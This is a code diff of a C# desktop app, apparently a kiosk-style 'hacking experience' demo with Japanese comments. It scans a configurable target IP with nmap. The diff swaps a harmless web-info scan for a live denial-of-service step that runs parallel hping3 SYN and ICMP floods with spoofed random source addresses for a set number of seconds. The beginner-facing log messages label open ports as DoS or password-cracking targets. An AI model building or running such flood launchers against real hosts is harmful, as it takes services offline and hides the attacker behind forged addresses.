@@ -12,48 +12,69 @@ namespace CyberScan
 {
     public partial class MainWindow : Window
     {
-        // デフォルトのターゲットIP（ファイルがない場合用）
+        // デフォルト設定
         private string _targetIp = "127.0.0.1";
-        // IPアドレスを記述しておく設定ファイル名
-        private const string ConfigFileName = "target.txt";
+        private int _ddosDuration = 15; // デフォルト15秒
+        
+        // 設定ファイル名
+        private const string ConfigFileName = "Settings.txt";
 
         public MainWindow()
         {
             InitializeComponent();
             
-            // キーボード操作のイベントハンドラを追加
+            // キーボードイベントとウィンドウ開始イベントの登録
             this.KeyDown += OnKeyDown;
-            // ウィンドウが開いたときのイベント
             this.Opened += OnWindowOpened;
         }
 
-        // ウィンドウが表示された直後に実行される初期化処理
         private void OnWindowOpened(object? sender, EventArgs e)
         {
-            LoadTargetIp();
+            LoadSettings();
             WriteLog("SYSTEM INITIALIZED.");
             WriteLog($"TARGET LOCKED: {_targetIp}");
+            WriteLog($"ATTACK TIMEOUT SET TO: {_ddosDuration} SECONDS");
             WriteLog("WAITING FOR USER AUTHORIZATION...");
         }
 
-        // 設定ファイル(target.txt)からIPアドレスを読み込む
-        private void LoadTargetIp()
+        // Settings.txt から設定を読み込む
+        private void LoadSettings()
         {
             try
             {
-                // 実行ファイルと同じ場所に target.txt があるか確認
                 if (File.Exists(ConfigFileName))
                 {
-                    string content = File.ReadAllText(ConfigFileName).Trim();
-                    if (!string.IsNullOrWhiteSpace(content))
+                    string[] lines = File.ReadAllLines(ConfigFileName);
+                    foreach (string line in lines)
                     {
-                        _targetIp = content;
+                        // コメント行や空行はスキップ
+                        if (string.IsNullOrWhiteSpace(line) || line.StartsWith("#")) continue;
+
+                        string[] parts = line.Split('=');
+                        if (parts.Length == 2)
+                        {
+                            string key = parts[0].Trim();
+                            string value = parts[1].Trim();
+
+                            if (key.Equals("IP", StringComparison.OrdinalIgnoreCase))
+                            {
+                                _targetIp = value;
+                            }
+                            else if (key.Equals("DDoSTime", StringComparison.OrdinalIgnoreCase))
+                            {
+                                if (int.TryParse(value, out int duration))
+                                {
+                                    _ddosDuration = duration;
+                                }
+                            }
+                        }
                     }
                 }
                 else
                 {
-                    // ファイルがない場合はデフォルト値で作成しておく（親切設計）
-                    File.WriteAllText(ConfigFileName, "127.0.0.1");
+                    // ファイルがない場合はデフォルト値で作成しておく
+                    string defaultSettings = "IP=127.0.0.1\nDDoSTime=15";
+                    File.WriteAllText(ConfigFileName, defaultSettings);
                     WriteLog($"[CONFIG] {ConfigFileName} not found. Created default.");
                 }
             }
@@ -62,32 +83,31 @@ namespace CyberScan
                 WriteLog($"[ERROR] Config load failed: {ex.Message}");
             }
             
-            // 画面のIP表示を更新
-            TargetIpDisplay.Text = _targetIp;
+            // UI更新
+            if (TargetIpDisplay != null)
+            {
+                TargetIpDisplay.Text = _targetIp;
+            }
         }
 
-        // キーボードショートカット処理 (管理者用機能)
+        // キー操作 (Ctrl+Q: 終了, F11: フルスクリーン切替)
         private void OnKeyDown(object? sender, KeyEventArgs e)
         {
-            // Ctrl + Q でアプリを強制終了
             if (e.KeyModifiers == KeyModifiers.Control && e.Key == Key.Q)
             {
                 Close();
             }
             
-            // F11 でフルスクリーンとウィンドウモードの切り替え
             if (e.Key == Key.F11)
             {
                 if (WindowState == WindowState.FullScreen)
                 {
-                    // ウィンドウモードに戻す
                     WindowState = WindowState.Normal;
                     SystemDecorations = SystemDecorations.Full;
                     Topmost = false;
                 }
                 else
                 {
-                    // フルスクリーン（キオスクモード）にする
                     WindowState = WindowState.FullScreen;
                     SystemDecorations = SystemDecorations.None;
                     Topmost = true;
@@ -106,45 +126,56 @@ namespace CyberScan
             WriteLog($"[*] INITIATING PORT SCAN ON {_targetIp}...");
             WriteLog("==========================================");
 
-            // Nmap実行
-            // -F: Fast Mode (主要100ポートのみスキャンして時間を短縮)
-            // -sV: Version Scan (動いているサービス名を取得)
+            // Nmap実行 (-F: 高速スキャン)
             await RunAttackToolAsync("nmap", $"-F -sV {_targetIp}");
 
             WriteLog("\n[SCAN COMPLETE] ANALYZING VULNERABILITIES...");
             
-            // フェーズ切り替え: スキャンボタンを隠し、攻撃メニューを表示
+            // フェーズ切り替え
             Phase1Panel.IsVisible = false;
             Phase2Panel.IsVisible = true;
             
-            // ボタンを有効化（本来は開いているポートに応じて分岐するが、体験用なのですべて有効化）
-            WebAttackButton.IsEnabled = true; 
+            // 攻撃ボタンを有効化
+            DosAttackButton.IsEnabled = true; 
             BruteForceButton.IsEnabled = true;
 
             StatusText.Text = "STATUS: VULNERABILITY DETECTED. SELECT ACTION.";
             StatusText.Foreground = Avalonia.Media.Brushes.Red;
         }
 
-        // --- フェーズ2A: Web脆弱性スキャン ---
-        private async void OnWebAttackClick(object sender, RoutedEventArgs e)
+        // --- フェーズ2A: DoS攻撃 (hping3) ---
+        private async void OnDosAttackClick(object sender, RoutedEventArgs e)
         {
             DisableAttackButtons();
-            StatusText.Text = "STATUS: EXECUTING WEB EXPLOIT...";
+            StatusText.Text = "STATUS: EXECUTING DoS ATTACK...";
+            StatusText.Foreground = Avalonia.Media.Brushes.Red; // 警告色
 
             WriteLog("\n==========================================");
-            WriteLog("[*] STARTING WEB VULNERABILITY SCAN...");
+            WriteLog($"[*] INITIATING SIMULTANEOUS DoS ATTACK...");
+            WriteLog($"[*] DURATION LIMIT: {_ddosDuration} SECONDS");
+            WriteLog("[!] WARNING: EXTREME NETWORK LOAD.");
             WriteLog("==========================================");
 
-            // 体験用にNmapのスクリプト機能を使ってWeb情報を取得
-            // (実際のNiktoなどは時間がかかるため、http-titleなどで代用)
-            await RunAttackToolAsync("nmap", $"-p 80,443 --script http-title,http-headers,http-methods {_targetIp}");
+            // 攻撃コマンドの準備
+            string args1 = $"{_ddosDuration}s hping3 -S -p 443 --flood --rand-source {_targetIp}";
+            string args2 = $"{_ddosDuration}s hping3 -1 --flood -d 3600 --rand-source {_targetIp}";
 
-            WriteLog("\n[ATTACK FINISHED] REPORT GENERATED.");
+            WriteLog("\n[*] LAUNCHING VECTOR A: TCP SYN FLOOD (Port 443)");
+            WriteLog("[*] LAUNCHING VECTOR B: ICMP LARGE PACKET FLOOD");
+
+            // タスクを並列で開始
+            var task1 = RunAttackToolAsync("timeout", args1);
+            var task2 = RunAttackToolAsync("timeout", args2);
+
+            // 両方の攻撃が終わるのを待つ
+            await Task.WhenAll(task1, task2);
+
+            WriteLog("\n[ATTACK STOPPED] ALL FLOOD ATTACKS COMPLETE.");
             EnableAttackButtons();
             StatusText.Text = "STATUS: READY FOR NEXT COMMAND.";
         }
 
-        // --- フェーズ2B: パスワードクラック (SSH/FTP) ---
+        // --- フェーズ2B: パスワードクラック (SSH) ---
         private async void OnBruteForceClick(object sender, RoutedEventArgs e)
         {
             DisableAttackButtons();
@@ -154,8 +185,7 @@ namespace CyberScan
             WriteLog("[*] INITIATING BRUTE FORCE ATTACK (SSH)...");
             WriteLog("==========================================");
 
-            // 体験用にNmapのSSH認証方式確認スクリプトを実行
-            // (実際のHydraは辞書ファイルが必要で複雑なため、雰囲気重視)
+            // 体験用にNmapのSSH認証確認スクリプトを実行
             await RunAttackToolAsync("nmap", $"-p 22 --script ssh-auth-methods {_targetIp}");
 
             WriteLog("\n[ATTACK FINISHED] ACCESS ATTEMPTS LOGGED.");
@@ -163,10 +193,9 @@ namespace CyberScan
             StatusText.Text = "STATUS: READY FOR NEXT COMMAND.";
         }
 
-        // --- システムリセット（最初に戻る） ---
+        // --- リセット処理 ---
         private void OnResetClick(object sender, RoutedEventArgs e)
         {
-            // 画面と状態を初期化
             LogOutput.Text = "";
             Phase2Panel.IsVisible = false;
             Phase1Panel.IsVisible = true;
@@ -175,24 +204,23 @@ namespace CyberScan
             StatusText.Text = "STATUS: WAITING FOR COMMAND";
             StatusText.Foreground = Avalonia.Media.Brushes.Yellow;
             
-            // IPを再読み込み（運用中にファイルを書き換えた場合に対応）
-            LoadTargetIp(); 
+            LoadSettings(); 
             WriteLog("SYSTEM RESET. READY.");
         }
 
         private void DisableAttackButtons()
         {
-            WebAttackButton.IsEnabled = false;
+            DosAttackButton.IsEnabled = false;
             BruteForceButton.IsEnabled = false;
         }
 
         private void EnableAttackButtons()
         {
-            WebAttackButton.IsEnabled = true;
+            DosAttackButton.IsEnabled = true;
             BruteForceButton.IsEnabled = true;
         }
 
-        // --- コマンド実行エンジン (Nmapなどを裏で動かす) ---
+        // コマンド実行エンジン
         private async Task RunAttackToolAsync(string command, string args)
         {
             try
@@ -209,19 +237,15 @@ namespace CyberScan
 
                 using var process = new Process { StartInfo = psi };
 
-                // 標準出力をリアルタイムで取得
                 process.OutputDataReceived += (s, e) => 
                 {
                     if (e.Data != null)
                     {
-                        // 初心者向けに翻訳して表示
                         var translated = TranslateForBeginner(e.Data);
-                        // UIスレッドで描画
                         Dispatcher.UIThread.Post(() => WriteLog(translated));
                     }
                 };
                 
-                // エラー出力も取得
                 process.ErrorDataReceived += (s, e) =>
                 {
                     if (e.Data != null) Dispatcher.UIThread.Post(() => WriteLog($"[STDERR] {e.Data}"));
@@ -236,43 +260,52 @@ namespace CyberScan
             catch (Exception ex)
             {
                 WriteLog($"[ERROR] Command Execution Failed: {ex.Message}");
-                // ツールが入っていない場合のデモ用フェイルセーフ
+                // ツールが入っていない場合のデモ用表示
                 await Task.Delay(1000);
-                WriteLog($"Simulating result for {command}...");
-                WriteLog("Target appears to be secure or tool not installed.");
+                
+                if (command.Contains("hping3") || args.Contains("hping3"))
+                {
+                     WriteLog("[SIMULATION] Sending packet floods...");
+                     WriteLog("[SIMULATION] Source IP: Random / Protocol: ICMP/TCP");
+                }
+                else if (command.Contains("thc-ssl-dos") || args.Contains("thc-ssl-dos"))
+                {
+                     WriteLog("[SIMULATION] Handshaking...");
+                     WriteLog("[SIMULATION] Server is slowing down...");
+                }
+                else
+                {
+                    WriteLog("Target appears to be secure or tool not installed.");
+                }
             }
         }
 
-        // --- ログ翻訳ロジック ---
+        // ログ翻訳ロジック
         private string TranslateForBeginner(string rawLog)
         {
             string output = rawLog;
             
-            // 特定のキーワードが見つかったら、解説文を追記する
+            // Nmapの翻訳
             if (rawLog.Contains("80/tcp") && rawLog.Contains("open")) 
-                output += "   <-- [発見] Webサーバー(HTTP)が動いています。Webサイトへの攻撃が可能です。";
-            
+                output += "   <-- [発見] Webサーバー(HTTP)が動いています。";
             if (rawLog.Contains("443/tcp") && rawLog.Contains("open")) 
-                output += "   <-- [発見] 暗号化Webサーバー(HTTPS)です。設定ミスがあれば侵入できます。";
-
+                output += "   <-- [発見] SSL Webサーバー(HTTPS)です。DoS攻撃の標的になります。";
             if (rawLog.Contains("22/tcp") && rawLog.Contains("open")) 
-                output += "   <-- [発見] SSH(遠隔操作)ポートです。パスワード総当たり攻撃の標的になります。";
-
-            if (rawLog.Contains("http-title"))
-                output = $"[情報収集] Webサイトのタイトルを取得: {rawLog.Trim()}";
-
-            if (rawLog.Contains("script execution failed"))
-                output = "[INFO] スクリプトの実行はスキップされました。";
-                
+                output += "   <-- [発見] SSHポートです。パスワードクラック可能です。";
+            
+            // hping3 の翻訳
+            if (rawLog.Contains("HPING"))
+            {
+                output = $"[攻撃開始] ターゲットへのフラッド攻撃(hping3)を開始しました。";
+            }
+            
             return output;
         }
 
-        // --- ログ出力ヘルパー ---
         private void WriteLog(string message)
         {
             if (LogOutput == null || LogScrollViewer == null) return;
             LogOutput.Text += $"{message}\n";
-            // 常に最新の行が見えるようにスクロール
             LogScrollViewer.ScrollToEnd();
         }
     }
